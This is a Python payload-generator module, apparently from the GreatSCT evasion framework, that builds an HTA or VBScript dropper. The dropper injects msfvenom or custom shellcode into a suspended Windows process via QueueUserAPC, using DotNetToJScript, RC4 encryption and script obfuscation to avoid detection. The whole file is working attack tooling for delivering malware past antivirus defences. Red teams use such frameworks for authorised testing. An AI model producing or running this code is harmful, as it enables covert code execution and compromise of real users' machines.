"""

MSHTA DotNetToJScript Shellcode injection with process migration via a suspended process and QueueUserAPC
Uses basic variable renaming obfuscation.

Adapated from code from:
    https://github.com/ConsciousHacker/Shellcode-Via-HTA/blob/master/BeaconMigrate.cs
    https://github.com/Veil-Framework/Veil/blob/master/Tools/Evasion/payloads/cs/shellcode_inject/base64.py

Module built by @ConsciousHacker

"""

import base64
import os
from Tools.Bypass.bypass_common import bypass_helpers # pylint: disable=E0611,E0401
from Tools.Bypass.bypass_common import gamemaker # pylint: disable=E0611,E0401
from Tools.Bypass.bypass_common import shellcode_help # pylint: disable=E0611,E0401
from Tools.Bypass.bypass_common import code_gen # pylint: disable=E0611,E0401
from Tools.Bypass.bypass_common import encryption # pylint: disable=E0611,E0401

class PayloadModule:

    def __init__(self, cli_obj):
        # required
        self.language = "mshta"
        self.extension = "hta"
        self.rating = "Excellent"
        self.description = "MSHTA DotNetToJScript Shellcode Injection with Process Migration"
        self.name = "MSHTA Shellcode Injection with Process Migration"
        self.path = "mshta/shellcode_inject/base64_migrate"
        self.shellcode = shellcode_help.Shellcode(cli_obj)
        self.cli_opts = cli_obj
        self.payload_source_code = ''
        if cli_obj.msfvenom is not None:
            self.payload_type = cli_obj.msfvenom
        elif not cli_obj.tool:
            self.payload_type = ''
        self.cli_shellcode = False

        # options we require user ineraction for- format is {OPTION : [Value, Description]]}
        self.required_options = {
            "PROCESS"   :  ["userinit.exe", "Any process from System32/SysWOW64"],
            "SCRIPT_TYPE" : ["JScript", "JScript or VBScript"],
            "ENCRYPTION" : ["X", "Encrypt the payload with RC4"],
            "JS_OBFUSCATION" : ["X", "Obfuscate the javascript decryption routine"]
        }

    def generate(self):
        # Generate the shellcode
        if not self.cli_shellcode:
            Shellcode = self.shellcode.generate(self.cli_opts)
            if self.shellcode.msfvenompayload:
                self.payload_type = self.shellcode.msfvenompayload
            elif self.shellcode.payload_choice:
                self.payload_type = self.shellcode.payload_choice
                self.shellcode.payload_choice = ''
            # assume custom shellcode
            else:
                self.payload_type = 'custom'
        else:
            Shellcode = self.cli_shellcode
        Shellcode = "0" + ",0".join(Shellcode.split("\\")[1:])
        Shellcode = base64.b64encode(
            bytes(Shellcode, 'latin-1')).decode('ascii')

        if not self.cli_shellcode:
            Shellcodex64 = self.shellcode.generate(self.cli_opts)
            if self.shellcode.msfvenompayload:
                self.payload_type = self.shellcode.msfvenompayload
            elif self.shellcode.payload_choice:
                self.payload_type = self.shellcode.payload_choice
                self.shellcode.payload_choice = ''
            # assume custom shellcode
            else:
                self.payload_type = 'custom'
        else:
            Shellcodex64 = self.cli_shellcode
        Shellcodex64 = "0" + ",0".join(Shellcodex64.split("\\")[1:])
        Shellcodex64 = base64.b64encode(
            bytes(Shellcodex64, 'latin-1')).decode('ascii')
        
        # randomize all our variables, yo
        x86 = bypass_helpers.randomString()
        x64 = bypass_helpers.randomString()
        # generate a random key
        key = bypass_helpers.randomString().lower()

        # figure out a sane way to generate two separate instances of shellcode within the framework
        # currently, only 32 bit payload shellcode will work
        
        payload_code, num_tabs_required = gamemaker.senecas_games(self)
        code = code_gen.genCSharpShellCodeMigration(self.required_options["PROCESS"][0], payload_code)

        with open("/tmp/hta_source.cs", "w") as f:
            f.write(code)

        if self.required_options["SCRIPT_TYPE"][0].lower() == "jscript":


            with open("/tmp/migrate.js", "w") as ff:
                ff.write("o.Print({0}, {1});".format(x86, x64)
                        )
            os.system(
                "mcs -platform:x86 -target:library -sdk:2 {0} -out:/tmp/dotnettojscript.dll".format("/tmp/hta_source.cs"))
            os.system("WINEPREFIX=/root/.greatsct wine /usr/share/greatsct/DotNetToJScript.exe /tmp/dotnettojscript.dll -ver auto -c HelloWorld -o {0} -s /tmp/migrate.js".format("/tmp/greatsct.js"))
            with open("/tmp/greatsct.js", 'r') as original:
                data = original.read()
            
            with open("/tmp/greatsct.js", 'w') as modified:
                modified.write("<script language=\"JScript\">\n\nvar {0} = \"{1}\";\nvar {2} = \"{3}\";\n\n".format(
                    x86, Shellcode, x64, Shellcodex64) + data + "\nwindow.close();\n</script>")
            
            with open("/tmp/greatsct.js", "r") as js:
                payload = js.read()
        
            if self.required_options["ENCRYPTION"][0].lower() != "x":
                

                encrypted_payload = encryption.rc4(key, payload)
                encrypted_payload = base64.b64encode(encrypted_payload)

                if self.required_options["JS_OBFUSCATION"][0].lower() != "x":
                    print("JS_OBFUSCATION: True")
                    source_code = code_gen.genRC4JScript(encrypted_payload, key, True)
                
                else:
                    print("JS_OBFUSCATION: False")
                    source_code = code_gen.genRC4JScript(encrypted_payload, key, False)
            
            else:
                source_code = payload

        elif self.required_options["SCRIPT_TYPE"][0].lower() == "vbscript":
            # do stuff

            with open("/tmp/migrate.vbs", "w") as ff:
                ff.write("o.Print {0},{1} ".format(x86, x64)
                         )
            os.system(
                "mcs -platform:x86 -target:library -sdk:2 {0} -out:/tmp/dotnettojscript.dll".format("/tmp/hta_source.cs"))
            os.system(
                "WINEPREFIX=/root/.greatsct wine /usr/share/greatsct/DotNetToJScript.exe /tmp/dotnettojscript.dll -ver auto -l vbscript -c HelloWorld -o {0} -s /tmp/migrate.vbs".format("/tmp/greatsct.vbs"))

            with open("/tmp/greatsct.vbs", 'r') as original:
                data = original.read()

            with open("/tmp/greatsct.vbs", 'w') as modified:
                modified.write("\nDim {0} : {0} = \"{1}\"\nDim {2} : {2} = \"{3}\"\n\n".format(
                    x86, Shellcode, x64, Shellcodex64) + data + "\n")

            with open("/tmp/greatsct.vbs", "r") as vbs:
                payload = vbs.read()

            if self.required_options["ENCRYPTION"][0].lower() != "x":

                encrypted_payload = encryption.rc4(key, payload)
                encrypted_payload = base64.standard_b64encode(bytes(encrypted_payload, "latin-1")).decode("ascii")

                if self.required_options["JS_OBFUSCATION"][0].lower() != "x":
                    source_code = code_gen.genRC4VBScript(
                        encrypted_payload, key, True)
                else:
                    source_code = code_gen.genRC4VBScript(
                        encrypted_payload, key, False)
            else:
                source_code = payload
        else:
            print("Script type not supported")

        self.payload_source_code = source_code
        return
